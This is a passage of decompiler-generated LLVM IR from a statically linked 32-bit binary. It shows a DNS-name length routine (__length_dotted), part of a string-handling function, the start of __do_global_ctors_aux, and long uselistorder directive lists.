  store i32 %v1_8067125, i32* @edi, align 4
  %v1_8067128 = icmp eq i32 %v1_8067125, 0
  br i1 %v1_8067128, label %dec_label_pc_8067131, label %dec_label_pc_806712c

dec_label_pc_806712c:                             ; preds = %dec_label_pc_806712c.lr.ph, %dec_label_pc_8067128
  %v0_80670d3 = phi i32 [ %v4_80670c9, %dec_label_pc_806712c.lr.ph ], [ %v1_8067125, %dec_label_pc_8067128 ]
  %v1_806712c = inttoptr i32 %v0_80670d3 to i8*
  %v2_806712c = load i8, i8* %v1_806712c, align 1
  %v3_806712c = icmp eq i8 %v2_806712c, 0
  %v1_806712f = icmp eq i1 %v3_806712c, false
  br i1 %v1_806712f, label %dec_label_pc_80670cf, label %dec_label_pc_8067131

dec_label_pc_8067131:                             ; preds = %dec_label_pc_8067128, %dec_label_pc_806712c, %dec_label_pc_8067105, %entry
  %tmp30 = icmp slt i32 %arg3, 1
  br i1 %tmp30, label %dec_label_pc_8067145, label %dec_label_pc_8067138

dec_label_pc_8067138:                             ; preds = %dec_label_pc_8067131
  %v1_806713c = load i32, i32* %ebx.global-to-local, align 4
  %v2_806713c = add i32 %v1_806713c, %arg2
  %v3_806713c = inttoptr i32 %v2_806713c to i8*
  store i8 0, i8* %v3_806713c, align 1
  %v0_8067140 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067140 = add i32 %v0_8067140, 1
  br label %dec_label_pc_8067148

dec_label_pc_8067145:                             ; preds = %dec_label_pc_80670fa, %dec_label_pc_80670f6, %dec_label_pc_8067131
  br label %dec_label_pc_8067148

dec_label_pc_8067148:                             ; preds = %dec_label_pc_8067138, %dec_label_pc_8067145
  %storemerge2 = phi i32 [ %v1_8067140, %dec_label_pc_8067138 ], [ -1, %dec_label_pc_8067145 ]
  store i32 %v0_80670c2, i32* @esi, align 4
  store i32 %v0_80670c1, i32* @edi, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %v1_806712c, { 1, 0 }
  uselistorder i32 %v1_8067125, { 0, 2, 1 }
  uselistorder i32 %v0_8067114, { 1, 0 }
  uselistorder i1 %v1_80670de, { 1, 0 }
  uselistorder i32 %v5_80670d4, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 37, 47, 48, 44, 45, 54, 55, 39, 40, 61, 3, 4, 15, 16, 17, 18, 19, 20, 21, 22, 23, 5, 6, 46, 0, 7, 24, 56, 49, 50, 62, 25, 26, 27, 43, 41, 42, 8, 9, 10, 11, 12, 13, 38, 51, 52, 53, 57, 58, 59, 28, 29, 30, 60, 14, 1, 2, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* @edx, { 311, 312, 87, 111, 5, 316, 314, 315, 4, 317, 318, 319, 320, 324, 325, 326, 327, 108, 109, 110, 114, 0, 115, 6, 26, 244, 88, 89, 90, 28, 27, 91, 92, 93, 94, 97, 98, 99, 100, 101, 102, 103, 95, 96, 386, 388, 389, 390, 391, 392, 393, 394, 107, 104, 105, 442, 9, 443, 340, 328, 329, 330, 341, 343, 359, 360, 10, 321, 322, 323, 106, 116, 112, 445, 113, 117, 118, 119, 120, 121, 122, 444, 123, 124, 125, 70, 71, 72, 7, 29, 395, 396, 331, 332, 11, 333, 334, 335, 397, 398, 399, 400, 401, 402, 403, 458, 459, 460, 461, 12, 462, 463, 344, 345, 283, 441, 446, 1, 447, 464, 465, 513, 512, 466, 284, 285, 13, 286, 287, 288, 289, 290, 291, 292, 293, 295, 296, 297, 298, 126, 476, 479, 14, 480, 477, 15, 478, 475, 448, 16, 449, 498, 299, 361, 362, 364, 365, 366, 367, 17, 127, 131, 128, 129, 130, 346, 347, 348, 349, 350, 351, 352, 358, 353, 354, 355, 356, 357, 73, 74, 75, 3, 313, 363, 368, 404, 369, 370, 18, 371, 336, 337, 338, 372, 373, 339, 405, 406, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 25, 424, 425, 407, 426, 19, 427, 428, 430, 20, 431, 432, 433, 434, 435, 436, 76, 21, 429, 437, 467, 22, 385, 196, 438, 439, 440, 481, 294, 383, 499, 500, 193, 382, 192, 132, 134, 133, 135, 140, 136, 137, 138, 139, 342, 269, 474, 30, 501, 2, 219, 220, 387, 482, 141, 502, 503, 511, 142, 143, 504, 505, 468, 469, 144, 483, 484, 485, 488, 489, 490, 77, 78, 486, 487, 145, 451, 452, 453, 454, 457, 146, 147, 149, 150, 151, 152, 153, 154, 155, 79, 80, 450, 455, 456, 148, 156, 491, 492, 493, 157, 158, 81, 82, 270, 31, 165, 166, 167, 83, 497, 506, 507, 508, 509, 510, 494, 496, 23, 495, 473, 470, 471, 472, 159, 160, 161, 162, 163, 164, 168, 169, 171, 172, 173, 175, 178, 179, 84, 85, 180, 176, 177, 170, 174, 181, 182, 183, 184, 185, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 24, 42, 191, 186, 189, 187, 188, 86, 190, 514, 515, 194, 195, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 43, 44, 45, 46, 47, 48, 50, 51, 49, 52, 53, 54, 55, 56, 58, 57, 59, 60, 61, 63, 62, 64, 65, 66, 67, 68, 69, 216, 217, 218, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 238, 242, 237, 240, 241, 8, 239, 303, 243, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 300, 301, 302, 304, 305, 306, 307, 308, 309, 310, 374, 375, 376, 377, 378, 379, 380, 381, 384, 516 }
  uselistorder i32 (i8*)* @strlen, { 5, 19, 18, 8, 14, 13, 12, 11, 10, 3, 9, 7, 6, 17, 16, 4, 2, 1, 0, 15 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 46, { 2, 1, 4, 3, 0, 6, 5, 7 }
  uselistorder i8* null, { 6, 10, 11, 12, 14, 13, 15, 4, 17, 1, 2, 16, 19, 18, 20, 5, 0, 21, 24, 25, 27, 23, 22, 26, 28, 29, 30, 7, 8, 9, 31, 3, 32 }
  uselistorder i32* @esi, { 611, 612, 84, 613, 292, 293, 85, 294, 93, 94, 95, 15, 295, 296, 212, 213, 214, 215, 216, 217, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 629, 630, 631, 632, 633, 634, 635, 16, 258, 259, 260, 261, 262, 297, 298, 774, 775, 17, 776, 853, 263, 264, 265, 266, 271, 272, 273, 751, 752, 761, 762, 763, 18, 764, 765, 636, 637, 766, 19, 767, 768, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 20, 787, 788, 246, 21, 247, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 349, 350, 351, 352, 638, 22, 639, 640, 641, 23, 642, 643, 648, 649, 654, 655, 656, 657, 658, 659, 660, 2, 661, 662, 663, 664, 665, 666, 667, 682, 625, 626, 627, 628, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 240, 237, 238, 239, 241, 242, 244, 243, 245, 248, 249, 250, 251, 252, 253, 254, 255, 24, 256, 257, 137, 138, 139, 140, 141, 142, 754, 755, 756, 267, 25, 268, 26, 269, 270, 753, 274, 275, 305, 276, 277, 278, 279, 280, 281, 282, 284, 283, 27, 12, 285, 286, 288, 86, 28, 287, 289, 290, 291, 299, 300, 301, 302, 872, 873, 874, 879, 0, 303, 304, 306, 307, 308, 309, 310, 311, 312, 875, 876, 877, 878, 313, 314, 315, 316, 317, 318, 757, 758, 759, 760, 319, 320, 321, 322, 323, 324, 769, 770, 325, 143, 30, 145, 146, 147, 144, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 29, 163, 164, 165, 166, 167, 168, 169, 161, 162, 170, 171, 172, 173, 174, 175, 771, 772, 773, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 31, 32, 338, 339, 33, 340, 341, 547, 548, 549, 550, 551, 918, 919, 920, 921, 683, 684, 789, 790, 791, 792, 793, 1, 794, 922, 923, 924, 34, 925, 926, 927, 928, 929, 1027, 1028, 1029, 599, 600, 601, 602, 603, 604, 605, 930, 942, 943, 342, 343, 344, 345, 738, 739, 740, 3, 741, 742, 743, 346, 347, 348, 956, 968, 35, 969, 970, 963, 964, 965, 966, 967, 960, 961, 962, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 36, 892, 87, 893, 894, 895, 896, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 685, 686, 689, 690, 691, 692, 521, 522, 523, 524, 525, 368, 88, 369, 370, 37, 13, 376, 371, 372, 373, 374, 375, 668, 38, 669, 670, 674, 671, 672, 673, 681, 675, 676, 677, 678, 679, 680, 588, 39, 589, 590, 591, 592, 593, 594, 595, 89, 176, 177, 178, 179, 180, 77, 40, 181, 182, 41, 183, 184, 185, 186, 83, 187, 76, 188, 189, 190, 90, 191, 1030, 42, 1031, 1032, 644, 645, 646, 647, 795, 796, 43, 797, 91, 78, 798, 687, 688, 693, 694, 1039, 1040, 799, 800, 801, 802, 803, 804, 805, 695, 696, 697, 698, 699, 700, 701, 650, 44, 14, 702, 703, 704, 705, 706, 45, 79, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 651, 46, 652, 653, 494, 47, 495, 496, 806, 807, 808, 809, 49, 810, 4, 812, 813, 814, 815, 48, 816, 817, 811, 818, 819, 820, 821, 5, 822, 823, 824, 825, 826, 827, 80, 50, 828, 829, 51, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 52, 847, 848, 849, 53, 192, 830, 6, 831, 832, 850, 54, 55, 851, 852, 931, 932, 940, 941, 1033, 1034, 1035, 1036, 1037, 1038, 717, 718, 719, 720, 721, 56, 722, 723, 724, 725, 504, 505, 506, 507, 508, 509, 747, 748, 749, 750, 497, 498, 499, 500, 726, 727, 728, 729, 730, 57, 58, 731, 732, 606, 607, 608, 1004, 1005, 736, 737, 377, 59, 378, 379, 380, 381, 382, 383, 388, 384, 385, 386, 387, 393, 394, 944, 945, 458, 571, 572, 946, 947, 948, 389, 390, 60, 391, 392, 971, 972, 973, 974, 7, 9, 8, 975, 976, 897, 903, 904, 914, 10, 915, 916, 917, 1006, 1007, 1011, 1012, 1013, 1014, 1025, 1026, 395, 396, 397, 398, 399, 400, 933, 934, 935, 936, 937, 938, 939, 401, 402, 403, 977, 978, 979, 983, 984, 985, 986, 987, 991, 193, 194, 195, 980, 981, 982, 61, 404, 405, 905, 906, 907, 908, 912, 913, 406, 407, 408, 409, 410, 411, 412, 196, 197, 198, 901, 898, 899, 900, 81, 902, 909, 910, 911, 413, 414, 415, 416, 417, 957, 958, 62, 959, 988, 989, 990, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 573, 574, 575, 576, 577, 1015, 1016, 1017, 1018, 1019, 199, 200, 201, 202, 203, 430, 431, 432, 433, 434, 435, 63, 436, 64, 437, 438, 439, 1020, 1021, 1022, 1023, 1024, 1008, 66, 65, 1009, 1010, 992, 993, 994, 67, 1002, 1003, 995, 996, 997, 998, 999, 1000, 1001, 440, 952, 953, 954, 955, 441, 442, 443, 444, 445, 82, 446, 447, 949, 950, 951, 204, 205, 206, 207, 208, 448, 68, 449, 450, 451, 452, 453, 454, 455, 456, 457, 459, 460, 461, 462, 463, 464, 465, 69, 466, 470, 471, 472, 473, 209, 210, 211, 474, 475, 476, 467, 468, 469, 744, 745, 746, 72, 96, 97, 98, 99, 71, 100, 101, 102, 70, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 490, 491, 477, 92, 482, 73, 483, 484, 485, 486, 487, 488, 489, 478, 74, 75, 11, 479, 480, 481, 492, 493, 501, 502, 503, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 128, 129, 130, 131, 132, 134, 133, 135, 136, 520, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 596, 597, 598, 609, 610, 733, 734, 735, 1041 }
  uselistorder i32* @edi, { 461, 44, 462, 463, 464, 42, 465, 176, 47, 45, 177, 112, 113, 114, 115, 116, 117, 118, 466, 10, 467, 0, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 481, 482, 483, 484, 485, 148, 149, 150, 599, 46, 600, 43, 659, 585, 586, 587, 588, 604, 11, 605, 606, 607, 137, 138, 139, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 489, 490, 491, 496, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 527, 478, 12, 479, 480, 122, 119, 120, 121, 4, 3, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 140, 141, 142, 143, 144, 145, 146, 147, 581, 582, 13, 14, 583, 584, 151, 152, 153, 154, 155, 191, 192, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 174, 173, 175, 178, 179, 180, 181, 672, 673, 677, 678, 182, 183, 184, 185, 186, 187, 188, 189, 190, 674, 15, 675, 676, 589, 590, 591, 592, 593, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 594, 595, 596, 597, 598, 193, 194, 195, 196, 378, 379, 380, 381, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 16, 619, 620, 621, 622, 623, 624, 625, 701, 702, 17, 703, 704, 18, 705, 706, 440, 707, 771, 441, 19, 442, 443, 197, 198, 199, 200, 201, 202, 203, 565, 20, 566, 567, 712, 722, 723, 724, 725, 726, 713, 714, 715, 716, 717, 718, 719, 720, 721, 679, 693, 694, 680, 681, 682, 683, 684, 685, 686, 687, 21, 688, 689, 690, 691, 692, 204, 205, 206, 207, 208, 209, 210, 211, 212, 9, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 528, 529, 22, 530, 531, 532, 533, 534, 535, 536, 345, 346, 347, 348, 349, 224, 225, 24, 23, 226, 227, 228, 229, 230, 238, 231, 232, 233, 234, 235, 236, 237, 515, 25, 516, 26, 517, 518, 519, 520, 525, 526, 1, 521, 522, 523, 524, 421, 27, 422, 423, 28, 424, 425, 426, 82, 29, 84, 85, 83, 30, 86, 31, 87, 88, 89, 90, 91, 33, 2, 92, 93, 94, 95, 32, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 492, 493, 494, 495, 626, 627, 628, 34, 629, 630, 769, 770, 631, 632, 633, 35, 497, 498, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 499, 500, 501, 309, 310, 311, 634, 635, 636, 637, 638, 639, 640, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 36, 655, 107, 108, 109, 641, 37, 642, 643, 656, 657, 658, 765, 766, 767, 768, 549, 550, 551, 552, 553, 554, 325, 326, 327, 328, 329, 574, 575, 576, 577, 317, 318, 319, 320, 321, 555, 556, 557, 558, 559, 560, 727, 728, 729, 444, 445, 446, 568, 569, 295, 296, 297, 272, 273, 274, 267, 268, 269, 298, 299, 300, 486, 487, 488, 239, 240, 241, 242, 243, 244, 513, 514, 407, 408, 755, 756, 757, 245, 246, 251, 252, 253, 762, 763, 764, 247, 248, 601, 602, 603, 730, 758, 759, 760, 761, 285, 409, 410, 38, 249, 250, 731, 732, 39, 733, 734, 254, 255, 708, 709, 256, 257, 735, 736, 737, 738, 695, 696, 697, 698, 699, 700, 258, 259, 5, 6, 260, 261, 262, 263, 264, 265, 266, 739, 740, 270, 271, 275, 276, 277, 278, 279, 280, 281, 748, 749, 750, 7, 40, 751, 752, 41, 753, 754, 741, 742, 743, 744, 745, 746, 747, 282, 283, 284, 710, 711, 110, 111, 286, 287, 288, 289, 290, 291, 292, 570, 571, 572, 573, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 293, 294, 301, 302, 303, 304, 306, 305, 8, 307, 308, 312, 313, 314, 315, 316, 322, 323, 324, 330, 331, 332, 333, 334, 335, 336, 337, 338, 63, 64, 65, 66, 67, 68, 69, 70, 71, 339, 340, 341, 342, 343, 344, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 561, 562, 563, 564, 578, 579, 580 }
  uselistorder label %dec_label_pc_8067148, { 1, 0 }
  uselistorder label %dec_label_pc_8067145, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8067131, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_806712c, { 1, 0 }
  uselistorder label %dec_label_pc_80670f6, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_806715e = icmp eq i32 %arg1, 0
  br i1 %v1_806715e, label %dec_label_pc_806718d, label %dec_label_pc_806717e.preheader

dec_label_pc_806717e.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_806717e10 = add i32 %arg2, %arg1
  %v3_806717e11 = inttoptr i32 %v2_806717e10 to i8*
  %v4_806717e12 = load i8, i8* %v3_806717e11, align 1
  %v1_806718214 = add i32 %arg2, 1
  %v1_806718515 = icmp eq i8 %v4_806717e12, 0
  %v1_806718716 = icmp eq i1 %v1_806718515, false
  br i1 %v1_806718716, label %dec_label_pc_806716d, label %dec_label_pc_8067189

dec_label_pc_8067164:                             ; preds = %dec_label_pc_806716d
  %v1_8067164 = add i32 %v0_806716417, 2
  br label %dec_label_pc_8067189

dec_label_pc_806716d:                             ; preds = %dec_label_pc_806717e.preheader, %dec_label_pc_806717e
  %v1_806718219 = phi i32 [ %v1_8067182, %dec_label_pc_806717e ], [ %v1_806718214, %dec_label_pc_806717e.preheader ]
  %v5_806717e18.in = phi i8 [ %v4_806717e, %dec_label_pc_806717e ], [ %v4_806717e12, %dec_label_pc_806717e.preheader ]
  %v0_806716417 = phi i32 [ %v2_806717b, %dec_label_pc_806717e ], [ %arg2, %dec_label_pc_806717e.preheader ]
  %v5_806717e18 = zext i8 %v5_806717e18.in to i32
  %v1_806716f = and i32 %v5_806717e18, 192
  %v6_8067174 = icmp eq i32 %v1_806716f, 192
  %v2_806717b = add i32 %v5_806717e18, %v1_806718219
  br i1 %v6_8067174, label %dec_label_pc_8067164, label %dec_label_pc_806717e

dec_label_pc_806717e:                             ; preds = %dec_label_pc_806716d
  store i32 %v2_806717b, i32* @ecx, align 4
  %v2_806717e = add i32 %v2_806717b, %arg1
  %v3_806717e = inttoptr i32 %v2_806717e to i8*
  %v4_806717e = load i8, i8* %v3_806717e, align 1
  %v1_8067182 = add i32 %v2_806717b, 1
  %v1_8067185 = icmp eq i8 %v4_806717e, 0
  %v1_8067187 = icmp eq i1 %v1_8067185, false
  br i1 %v1_8067187, label %dec_label_pc_806716d, label %dec_label_pc_8067189

dec_label_pc_8067189:                             ; preds = %dec_label_pc_806717e.preheader, %dec_label_pc_806717e, %dec_label_pc_8067164
  %v0_8067189 = phi i32 [ %v1_8067164, %dec_label_pc_8067164 ], [ %v1_806718214, %dec_label_pc_806717e.preheader ], [ %v1_8067182, %dec_label_pc_806717e ]
  %v2_806718b = sub i32 %v0_8067189, %arg2
  br label %dec_label_pc_806718d

dec_label_pc_806718d:                             ; preds = %entry, %dec_label_pc_8067189
  %v0_8067190 = phi i32 [ -1, %entry ], [ %v2_806718b, %dec_label_pc_8067189 ]
  ret i32 %v0_8067190

; uselistorder directives
  uselistorder i8 %v4_806717e, { 1, 0 }
  uselistorder i32 %v2_806717b, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 2, { 366, 289, 398, 399, 70, 181, 370, 371, 78, 82, 81, 367, 372, 373, 374, 293, 375, 376, 377, 378, 379, 380, 83, 84, 85, 130, 131, 407, 182, 183, 400, 132, 184, 7, 321, 123, 319, 320, 408, 124, 86, 409, 87, 401, 402, 418, 8, 9, 10, 140, 185, 186, 187, 133, 88, 171, 381, 382, 383, 384, 71, 11, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 273, 0, 1, 101, 403, 290, 404, 134, 405, 304, 305, 172, 188, 189, 274, 406, 141, 306, 190, 12, 13, 142, 135, 410, 411, 173, 14, 143, 144, 385, 191, 192, 193, 194, 195, 196, 197, 421, 136, 291, 5, 198, 275, 199, 276, 200, 277, 422, 125, 15, 361, 79, 201, 202, 2, 203, 3, 204, 4, 205, 206, 16, 17, 18, 19, 145, 419, 20, 21, 174, 22, 207, 322, 323, 324, 102, 325, 326, 104, 103, 105, 388, 389, 390, 391, 106, 146, 294, 392, 393, 327, 107, 328, 329, 126, 386, 387, 108, 208, 137, 357, 147, 307, 308, 23, 309, 109, 310, 111, 311, 24, 112, 110, 25, 312, 113, 209, 313, 314, 315, 316, 317, 26, 318, 27, 337, 338, 368, 369, 333, 334, 127, 128, 129, 28, 423, 148, 114, 115, 412, 413, 138, 29, 30, 414, 31, 415, 32, 149, 416, 417, 394, 396, 210, 175, 295, 420, 116, 117, 118, 119, 120, 176, 211, 278, 354, 139, 33, 212, 213, 34, 121, 299, 292, 6, 214, 279, 215, 280, 330, 216, 331, 332, 35, 218, 36, 217, 37, 38, 220, 219, 39, 40, 41, 42, 150, 300, 301, 302, 303, 221, 222, 335, 151, 80, 336, 223, 177, 339, 224, 43, 178, 340, 225, 44, 226, 227, 152, 45, 46, 47, 48, 49, 72, 50, 73, 51, 52, 74, 53, 228, 229, 343, 153, 341, 54, 342, 344, 230, 231, 232, 233, 179, 180, 345, 346, 236, 55, 234, 56, 235, 296, 57, 58, 59, 60, 61, 75, 62, 63, 64, 65, 66, 67, 238, 347, 237, 281, 239, 282, 154, 241, 155, 240, 156, 242, 157, 243, 348, 349, 158, 244, 283, 159, 245, 350, 351, 297, 246, 284, 160, 247, 248, 352, 353, 161, 249, 285, 162, 250, 355, 356, 251, 263, 252, 253, 163, 254, 164, 255, 358, 165, 298, 256, 166, 257, 258, 167, 259, 286, 168, 260, 359, 360, 169, 261, 362, 363, 364, 122, 170, 262, 365, 68, 265, 69, 264, 287, 76, 395, 267, 266, 288, 77, 397, 268, 269, 270, 271, 272 }
  uselistorder i8 0, { 49, 5, 272, 273, 116, 105, 7, 280, 275, 276, 6, 278, 279, 277, 39, 281, 2, 3, 117, 9, 221, 220, 8, 50, 282, 283, 284, 331, 332, 374, 12, 290, 286, 287, 285, 10, 288, 289, 11, 40, 291, 292, 296, 297, 298, 299, 304, 15, 16, 51, 14, 13, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 330, 78, 76, 77, 118, 119, 18, 223, 222, 17, 224, 225, 293, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 4, 349, 350, 351, 392, 352, 413, 250, 52, 69, 251, 19, 411, 397, 398, 399, 375, 376, 377, 378, 379, 380, 53, 381, 306, 307, 120, 121, 300, 301, 43, 303, 20, 242, 243, 244, 245, 246, 79, 80, 81, 82, 83, 84, 85, 86, 22, 87, 88, 91, 89, 90, 41, 92, 93, 94, 95, 21, 96, 24, 191, 192, 23, 274, 353, 354, 70, 1, 35, 36, 37, 34, 0, 54, 55, 56, 355, 305, 175, 308, 302, 309, 294, 295, 310, 311, 312, 356, 357, 358, 359, 360, 361, 362, 363, 364, 25, 365, 366, 367, 368, 369, 370, 371, 372, 97, 393, 313, 314, 315, 327, 373, 316, 317, 122, 412, 394, 123, 124, 44, 125, 401, 402, 403, 404, 405, 407, 408, 409, 406, 382, 383, 384, 387, 385, 386, 26, 388, 389, 391, 126, 127, 128, 129, 130, 131, 132, 133, 134, 390, 45, 135, 410, 136, 137, 396, 400, 98, 99, 239, 138, 139, 395, 100, 101, 102, 103, 140, 141, 142, 143, 145, 144, 27, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 158, 157, 71, 72, 73, 74, 159, 46, 162, 160, 161, 163, 164, 165, 166, 167, 169, 168, 28, 170, 171, 172, 173, 174, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 42, 188, 189, 75, 47, 190, 193, 194, 195, 57, 196, 197, 198, 58, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 217, 216, 29, 213, 214, 31, 215, 30, 218, 219, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 59, 237, 238, 240, 241, 247, 248, 249, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 33, 265, 32, 266, 48, 267, 268, 269, 270, 271, 318, 319, 320, 321, 322, 323, 324, 325, 326, 328, 329, 38, 104, 60, 61, 62, 63, 64, 65, 66, 67, 68 }
  uselistorder i32* @ecx, { 33, 4, 121, 257, 14, 258, 259, 260, 261, 15, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 122, 319, 330, 116, 124, 125, 5, 222, 0, 223, 108, 109, 110, 112, 113, 111, 278, 16, 6, 279, 332, 333, 334, 335, 321, 322, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 8, 19, 281, 282, 17, 7, 18, 283, 286, 287, 288, 289, 290, 10, 32, 9, 114, 115, 323, 324, 131, 132, 11, 34, 320, 325, 35, 117, 118, 119, 120, 123, 410, 409, 126, 127, 128, 129, 408, 130, 326, 327, 328, 79, 80, 81, 20, 82, 83, 329, 12, 224, 1, 225, 336, 337, 39, 40, 41, 338, 284, 285, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 36, 364, 365, 366, 367, 368, 369, 37, 370, 31, 240, 438, 250, 241, 242, 243, 244, 245, 246, 133, 314, 315, 134, 135, 136, 137, 313, 316, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 21, 457, 442, 443, 444, 435, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 22, 429, 430, 432, 433, 434, 431, 477, 247, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 293, 294, 295, 296, 297, 298, 299, 301, 302, 303, 304, 305, 151, 23, 152, 157, 153, 154, 155, 156, 291, 292, 13, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 194, 255, 256, 193, 42, 24, 300, 184, 43, 44, 306, 307, 371, 372, 373, 374, 375, 376, 377, 38, 378, 379, 380, 381, 382, 383, 25, 26, 2, 3, 384, 385, 27, 386, 387, 388, 389, 390, 392, 393, 394, 395, 99, 100, 391, 396, 439, 308, 186, 187, 468, 469, 478, 310, 280, 158, 160, 159, 161, 163, 162, 483, 470, 164, 165, 331, 440, 484, 485, 236, 237, 437, 479, 166, 317, 167, 471, 441, 436, 168, 101, 238, 486, 169, 170, 311, 102, 103, 104, 105, 248, 188, 312, 106, 475, 28, 476, 481, 482, 480, 472, 473, 474, 30, 29, 171, 172, 173, 174, 175, 176, 177, 63, 64, 178, 179, 107, 180, 181, 182, 183, 45, 185, 189, 190, 191, 192, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 195, 196, 197, 198, 199, 200, 46, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 47, 220, 251, 48, 221, 226, 227, 228, 229, 230, 231, 232, 233, 49, 50, 51, 234, 52, 53, 235, 239, 54, 55, 56, 57, 58, 249, 59, 60, 252, 253, 254, 309, 61, 318, 62 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_806718d, { 1, 0 }
  uselistorder label %dec_label_pc_8067189, { 1, 2, 0 }
  uselistorder label %dec_label_pc_806716d, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_80671ac = load i32, i32* @global_var_806f84c.868, align 4
  %v10_80671b1 = icmp eq i32 %v0_80671ac, -1
  br i1 %v10_80671b1, label %dec_label_pc_80671c2, label %dec_label_pc_80671b6.preheader

dec_label_pc_80671b6.preheader:                   ; preds = %entry
  br label %dec_label_pc_80671b6

dec_label_pc_80671b6:                             ; preds = %dec_label_pc_80671b6.preheader, %dec_label_pc_80671b6
  %v4_80671b9 = phi i32 [ %v0_80671ac, %dec_label_pc_80671b6.preheader ], [ %v2_80671bb, %dec_label_pc_80671b6 ]
